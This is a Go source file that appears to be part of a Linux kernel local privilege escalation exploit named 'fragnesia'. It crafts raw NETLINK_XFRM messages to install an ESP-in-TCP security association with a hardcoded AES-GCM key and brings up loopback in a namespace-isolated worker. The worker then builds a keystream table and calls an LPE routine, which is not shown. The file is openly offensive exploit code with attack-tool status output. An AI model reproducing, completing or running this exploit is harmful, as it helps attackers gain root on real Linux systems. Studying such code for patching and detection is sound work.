package main

// XFRM SA setup for ESP-in-TCP with AES-128-GCM AEAD (fragnesia path).
// One SA is enough — the keystream table technique reuses it for all bytes.

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	xfrmMsgNewSA = 0x10 // XFRM_MSG_NEWSA
	xfrmaAlgAEAD = 18   // XFRMA_ALG_AEAD
	xfrmaEncap   = 4    // XFRMA_ENCAP

	// TCP_ENCAP_ESPINTCP: encap type for ESP-in-TCP in XFRMA_ENCAP.
	tcpEncapESPInTCP = 7
	tcpEncapPort     = 5556
	espSPI           = 0x100

	nlmFCreate = 0x400 // NLM_F_CREATE
	nlmFExcl   = 0x200 // NLM_F_EXCL
)

// aeadKey is the 20-byte AES-128-GCM key: 16-byte AES key + 4-byte GCM salt.
var aeadKey = [20]byte{
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04,
}

var loopback6 = net.ParseIP("::1").To16()

func nlAlign(n int) int { return (n + 3) &^ 3 }

func putAttr(buf []byte, pos *int, attrType int, data []byte) {
	attrLen := 4 + len(data)
	binary.LittleEndian.PutUint16(buf[*pos:], uint16(attrLen))
	binary.LittleEndian.PutUint16(buf[*pos+2:], uint16(attrType))
	copy(buf[*pos+4:], data)
	*pos += nlAlign(attrLen)
}

func bringUpLoopback() error {
	s, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return fmt.Errorf("socket(loopback): %w", err)
	}
	defer syscall.Close(s)

	var ifr [unix.IFNAMSIZ + 64]byte
	copy(ifr[:], "lo")
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCGIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCGIFFLAGS: %w", errno)
	}
	flags := binary.LittleEndian.Uint16(ifr[unix.IFNAMSIZ:])
	flags |= unix.IFF_UP | unix.IFF_RUNNING
	binary.LittleEndian.PutUint16(ifr[unix.IFNAMSIZ:], flags)
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCSIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCSIFFLAGS: %w", errno)
	}
	return nil
}

// addXfrmSA installs one ESP-in-TCP SA with AES-128-GCM AEAD via NETLINK_XFRM.
// Uses transport mode on IPv6 loopback (::1 → ::1).
func addXfrmSA() error {
	sk, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_RAW, unix.NETLINK_XFRM)
	if err != nil {
		return fmt.Errorf("socket(NETLINK_XFRM): %w", err)
	}
	defer syscall.Close(sk)

	if err := syscall.Bind(sk, &syscall.SockaddrNetlink{Family: syscall.AF_NETLINK}); err != nil {
		return fmt.Errorf("bind(netlink): %w", err)
	}

	buf := make([]byte, 4096)
	xs := buf[16:] // xfrm_usersa_info body (224 bytes) after 16-byte nlmsghdr

	// xfrm_usersa_info field offsets (verified against SizeofXfrm* constants):
	//   [0..55]    sel (56)  — wildcard, leave zero
	//   [56..79]   id (24)
	//   [80..95]   saddr (16)
	//   [96..159]  lft (64)  — unlimited limits
	//   [160..191] curlft (32) — zero
	//   [192..203] stats (12) — zero
	//   [204]      seq (4)
	//   [208]      reqid (4)
	//   [212]      family (2)
	//   [214]      mode (1)
	//   [215]      replay_window (1)
	//   [216]      flags (1)
	//   [217..223] pad (7)

	// id.daddr = ::1  (offset 56, within 24-byte xfrm_id: daddr@0, spi@16, proto@20)
	copy(xs[56:], loopback6)
	binary.BigEndian.PutUint32(xs[72:], espSPI)    // id.spi (BE)
	xs[76] = syscall.IPPROTO_ESP                    // id.proto

	// saddr = ::1
	copy(xs[80:], loopback6)

	// lft: soft/hard byte+packet limits = XFRM_INF; time limits = 0 (no expiry)
	for i := 0; i < 4; i++ {
		binary.LittleEndian.PutUint64(xs[96+i*8:], ^uint64(0))
	}

	// tail
	binary.LittleEndian.PutUint32(xs[208:], 1)                // reqid
	binary.LittleEndian.PutUint16(xs[212:], syscall.AF_INET6) // family
	// mode = 0 (XFRM_MODE_TRANSPORT), flags = 0 (no ESN)

	pos := 16 + 224 // attributes start after nlmsghdr + xfrm_usersa_info

	// XFRMA_ALG_AEAD: xfrm_algo_aead { name[64] + key_len(4) + icv_len(4) + key[] }
	aeadAttr := make([]byte, 64+4+4+len(aeadKey))
	copy(aeadAttr[0:], "rfc4106(gcm(aes))")
	binary.LittleEndian.PutUint32(aeadAttr[64:], uint32(len(aeadKey)*8)) // 160 bits
	binary.LittleEndian.PutUint32(aeadAttr[68:], 128)                    // icv_len = 128 bits
	copy(aeadAttr[72:], aeadKey[:])
	putAttr(buf, &pos, xfrmaAlgAEAD, aeadAttr)

	// XFRMA_ENCAP: xfrm_encap_tmpl { type(2) + sport(2,BE) + dport(2,BE) + pad(2) + oa(16) }
	encapAttr := make([]byte, 24)
	binary.LittleEndian.PutUint16(encapAttr[0:], tcpEncapESPInTCP)
	binary.BigEndian.PutUint16(encapAttr[2:], tcpEncapPort)
	binary.BigEndian.PutUint16(encapAttr[4:], tcpEncapPort)
	putAttr(buf, &pos, xfrmaEncap, encapAttr)

	binary.LittleEndian.PutUint32(buf[0:], uint32(pos))
	binary.LittleEndian.PutUint16(buf[4:], xfrmMsgNewSA)
	binary.LittleEndian.PutUint16(buf[6:], uint16(syscall.NLM_F_REQUEST|syscall.NLM_F_ACK|nlmFCreate|nlmFExcl))
	binary.LittleEndian.PutUint32(buf[8:], 1)
	binary.LittleEndian.PutUint32(buf[12:], uint32(os.Getpid()))

	if _, err := syscall.Write(sk, buf[:pos]); err != nil {
		return fmt.Errorf("send XFRM_MSG_NEWSA: %w", err)
	}

	rbuf := make([]byte, 4096)
	n, err := syscall.Read(sk, rbuf)
	if err != nil || n < 16 {
		return fmt.Errorf("recv XFRM ack: %w", err)
	}
	if binary.LittleEndian.Uint16(rbuf[4:]) == syscall.NLMSG_ERROR {
		if code := int32(binary.LittleEndian.Uint32(rbuf[16:])); code != 0 {
			return fmt.Errorf("XFRM_MSG_NEWSA error: %d", code)
		}
	}
	return nil
}

// runWorker is the namespace-isolated child entry point (called when workerEnv=1).
func runWorker() {
	if err := bringUpLoopback(); err != nil {
		fmt.Fprintln(os.Stderr, "[!] loopback:", err)
		os.Exit(2)
	}
	time.Sleep(100 * time.Millisecond)

	if err := addXfrmSA(); err != nil {
		fmt.Fprintln(os.Stderr, "[!] addXfrmSA:", err)
		os.Exit(2)
	}
	fmt.Fprintln(os.Stderr, "[+] XFRM SA installed (ESP-in-TCP, AES-128-GCM)")

	table, err := buildKeystreamTable()
	if err != nil {
		fmt.Fprintln(os.Stderr, "[!] keystream table:", err)
		os.Exit(2)
	}
	fmt.Fprintln(os.Stderr, "[+] keystream table built (256/256 entries)")

	if err := fragnesiaLPE(table); err != nil {
		fmt.Fprintln(os.Stderr, "[!] LPE:", err)
		os.Exit(2)
	}

	os.Exit(0)
}
